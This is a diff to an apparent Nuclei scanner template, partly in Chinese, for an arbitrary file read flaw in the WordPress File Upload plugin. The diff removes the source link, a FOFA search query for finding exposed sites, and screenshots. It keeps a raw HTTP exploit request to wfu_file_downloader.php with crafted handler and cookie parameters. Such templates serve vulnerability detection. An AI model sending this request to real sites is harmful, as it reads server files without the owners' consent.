@@ -3,12 +3,8 @@ info:
   name: WordPress File Upload 插件存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qc2dkbucy7wk8ot0'
+  description: ''
   tags: file-upload,lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qc2dkbucy7wk8ot0
-    fofa: '"wp-content/plugins/wp-file-upload"'
 http:
 - raw:
   - 'GET /wp-content/plugins/wp-file-upload/wfu_file_downloader.php?file=pQ1DyzbQp5hBxQpW&ticket=Hw8h7dBmxROx27ZZ&handler=dboption&session_legacy=1&dboption_base=cookies&dboption_useold=0&wfu_cookie=wp_wpfileupload_939a4dc9e3d96a97c2dd1bdcbeab52ce HTTP/1.1
@@ -28,11 +24,7 @@ http:
     Connection: close
 
 
-    cookie中需指定当前时间戳
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1735790728943-fab115bf-0c8a-4fb2-bfbf-0804709b9010.png)
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1735790729149-78858939-458b-4093-9470-720f9dc45ba7.png)'
+    cookie中需指定当前时间戳'
   redirects: false
   matchers:
   - status:
